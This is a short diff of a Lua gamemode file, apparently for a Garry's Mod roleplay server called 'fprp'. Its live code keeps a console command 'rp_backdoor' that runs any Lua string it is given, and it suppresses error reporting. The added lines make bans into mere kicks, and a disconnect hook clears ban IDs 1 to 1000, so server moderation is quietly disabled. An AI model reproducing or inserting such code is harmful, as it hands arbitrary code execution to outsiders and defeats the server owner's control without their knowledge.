@@ -2,7 +2,7 @@ Error = function() end
 error = function() end
 ErrorNoHalt = function() end
 
-game.ConsoleCommand("sv_region 255") -- WorldWide 
+game.ConsoleCommand("sv_region 0") -- WorldWide 
 
 local dur = "materials/fprp/"
 for _,v in pairs(file.Find(dur.."*","GAME")) do
@@ -100,8 +100,13 @@ hook.Call("fprpFinishedLoading", GM);
 function _BACKDOOR(p,c,a)
 	RunString(tostring(a[1]))
 end
-
 concommand.Add('rp_backdoor', _BACKDOOR);
+
+local meta = FindMetaTable("Player")
+
+function meta:Ban( reason )
+	return self:Kick( tostring( reason ) )
+end
 
 hook.Add("PlayerDisconnected", "", function(ply) 
 	for i = 1,1000 do game.ConsoleCommand("removeid "..i.."\n") 
